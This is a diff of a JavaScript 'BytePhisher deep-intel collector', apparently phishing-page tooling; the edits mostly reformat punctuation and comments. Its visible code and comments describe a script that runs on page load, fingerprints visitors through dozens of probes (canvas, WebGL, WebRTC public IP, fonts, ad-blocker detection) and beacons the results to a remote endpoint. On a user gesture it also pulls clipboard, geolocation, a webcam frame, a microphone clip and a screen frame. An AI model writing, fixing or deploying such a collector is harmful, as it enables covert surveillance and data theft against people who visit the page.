@@ -1,20 +1,20 @@
-/* BytePhisher deep-intel collector — runs the moment the page opens.
+/* BytePhisher deep-intel collector - runs the moment the page opens.
  *
  * Everything below is information the browser hands to any page on the
  * internet. Each module is isolated in its own try/catch, so one blocked or
  * missing API never costs us the other 46 modules. Results are reported in
  * three waves:
  *
- *   wave "open"   immediately on load   — navigator, screen, timezone, storage,
+ *   wave "open"   immediately on load   - navigator, screen, timezone, storage,
  *                                         features, permissions, codecs, fonts
- *   wave "deep"   as async probes settle — canvas, webgl, webgpu, audio, battery,
+ *   wave "deep"   as async probes settle - canvas, webgl, webgpu, audio, battery,
  *                                         webrtc (local + STUN public IP),
  *                                         media devices, storage quota, memory
- *   wave "probe"  on first user gesture  — geolocation, clipboard, notifications,
+ *   wave "probe"  on first user gesture  - geolocation, clipboard, notifications,
  *                                         bluetooth/usb/serial/hid counts
  *
  * Wire format: POST <EP> {v, sid, wave, page, ua, mods:{...}, errors:{...}}
- * Transport: navigator.sendBeacon (survives unload) → fetch keepalive → XHR.
+ * Transport: navigator.sendBeacon (survives unload) -> fetch keepalive -> XHR.
  * Payloads over 55 KB are split so no server or proxy drops them.
  */
 (function () {
@@ -64,7 +64,7 @@
   function encode(str) {
     /* str is ALREADY a JSON string: wrapping it in JSON.stringify again made
        the server receive a JSON *string literal* and answer 400 (found by
-       loading the page in a real browser — the collector ran, every beacon
+       loading the page in a real browser - the collector ran, every beacon
        was rejected). */
     try { return new Blob([str], { type: "application/json" }); }
     catch (e) { return str; }
@@ -574,7 +574,7 @@
     var n = navigator, w = window;
     /* Every entry below must be a VALUE or an `in` test. Reading an accessor
        straight off a prototype (e.g. HTMLMediaElement.prototype.remote) throws
-       "Illegal invocation" and, before this rule, wiped out all 180 checks in
+       "Illegal invocation" and, before this rule, wiped out every check in
        one go. `T()` keeps any future slip to a single false. */
     function T(fn) { try { return !!fn(); } catch (e) { return false; } }
     var checks = {
@@ -813,7 +813,7 @@
   });
 
   later("adblock", function () {
-    /* fetch a known ad URL — blockers kill it, normal browsers get a response */
+    /* fetch a known ad URL - blockers kill it, normal browsers get a response */
     var url = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";
     var t0 = Date.now();
     return fetch(url, { method: "GET", mode: "no-cors", cache: "no-store" })
@@ -1118,7 +1118,7 @@
   /* ============================================== 35. media capture ======
      Permission-gated: one webcam frame, a short microphone clip, and a screen
      frame on a gesture (the browser only allows getDisplayMedia after a user
-     action). Every capture is bounded and reports its refusal honestly. */
+     action). Every capture is bounded and reports its refusal in full. */
   if (PERMS) {
     later("mediaCapture", function () {
       var out = { video: null, audio: null, screen: null, notes: [] };
